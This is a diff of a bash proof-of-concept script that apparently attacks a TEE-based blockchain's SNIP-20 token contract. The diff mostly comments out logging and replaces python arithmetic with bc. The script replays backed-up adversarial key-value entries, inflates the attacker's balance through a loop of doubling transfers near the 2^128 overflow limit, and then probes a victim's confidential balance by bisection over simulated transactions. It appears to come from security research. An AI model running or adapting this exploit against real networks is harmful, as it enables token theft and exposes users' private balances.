@@ -109,27 +109,27 @@ teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to start Balanc
 for i in {1..114}; do
     echo
     teebox log "starting iteration=${i} ..."
-    show_attacker_balances
+    #show_attacker_balances
 
     # now balance[addr1]=0
     # replay the balance[addr1] back to B
     #teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to restore ..."
-    teebox log "Replay(balance\[attacker1]=B)    [light_goldenrod1]# reset attacker's account "
+    #teebox log "Replay(balance\[attacker1]=B)    [light_goldenrod1]# reset attacker's account "
     cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
     cp -f $BACKUP/backup_adv_value $BACKUP/adv_value
 
-    teebox log "After restoring adv kv"
-    show_attacker_balances
+    #teebox log "After restoring adv kv"
+    #show_attacker_balances
 
     #teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to simulate tx ..."
-    teebox log "[bold]Simulate(Transfer(attacker2, attacker1, amount=${amount}))[/]"
+    #teebox log "[bold]Simulate(Transfer(attacker2, attacker1, amount=${amount}))[/]"
     generate_and_sign_transfer ${attacker2} ${attacker1} $amount snip20_boost_1
     simulate_tx snip20_boost_1
-    teebox log "After Simulate()"
+    #teebox log "After Simulate()"
     #show_attacker_balances
 
     #teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] before wiping out kv store and attacker's balance ..."
-    teebox log "(Wipe out key-value store and attacker addr1)"
+    #teebox log "(Wipe out key-value store and attacker addr1)"
     rm -f $BACKUP/adv_key
     rm -f $BACKUP/adv_value
     rm -f $BACKUP/kv_store
@@ -138,31 +138,30 @@ for i in {1..114}; do
     touch $BACKUP/kv_store
 
     #teebox log "After Replay()"
-    show_attacker_balances
+    #show_attacker_balances
 
     #teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to simulate tx ..."
 
     # amt := B if 2B ≤ (2^128 − 1) else (2^128 − 1) − B
-    #amount=$(echo $(python -c "print ${amount}*2"))
     amount=$(bc <<< "${amount} * 2")
 
-    teebox log "[bold]Simulate(Transfer(attacker1, attacker2, amount=${amount}))[/]"
+    #teebox log "[bold]Simulate(Transfer(attacker1, attacker2, amount=${amount}))[/]"
     generate_and_sign_transfer ${attacker1} ${attacker2} ${amount} snip20_boost_2
     simulate_tx snip20_boost_2
 
-    teebox log "After Simulate()"
-    show_attacker_balances
+    #teebox log "After Simulate()"
+    #show_attacker_balances
 
     # attacker addr1 (sender above) encrypted amount sent
     tag=$(sed '4q;d' $BACKUP/kv_store)
     value=${tag:8:-1} 
     echo $value > $BACKUP/backup_adv_value
 
-    teebox log "ending iteration=${i}"
+    #teebox log "ending iteration=${i}"
     #show_attacker_balances
 done
 
-amount=$(echo $(python -c "print 2**128-1-${amount}"))
+amount=$(bc <<< "2^128 - 1 - ${amount}")
 generate_and_sign_transfer ${attacker1} ${attacker2} $amount snip20_boost_1
 cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
 cp -f $BACKUP/backup_adv_value $BACKUP/adv_value
@@ -172,7 +171,7 @@ res3=$(cat $BACKUP/simulate_result)
 #echo $res3
 
 # probe victim balance
-amount=$(echo $(python -c "print 2**128-1"))
+amount=$(bc <<< "2^128 - 1")
 generate_and_sign_transfer ${attacker2} ${attacker1} $amount snip20_getkey
 rm -f $BACKUP/kv_store
 touch $BACKUP/kv_store
@@ -188,7 +187,6 @@ echo $key > $BACKUP/backup_adv_key
 echo $value > $BACKUP/backup_adv_value
 
 low=0
-#high=$(echo $(python -c "print 2**128-1"))
 high=$(bc <<< "2^128 - 1")
 cnt=0
 
@@ -198,7 +196,6 @@ teebox info-panel "Through a bisection search, we simulate transactions that tra
 teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to start probing victim's balance ..."
 
 while [[ "$(bc <<< "${high} - ${low}")" -ne 0 ]]; do
-#while [ $(echo $(python -c "print ${high}-${low}")) != "0" ]; do
     probe=$(bc <<< "(${high} + ${low} + 1) / 2" )
     echo
     teebox log "iteration=${cnt}"
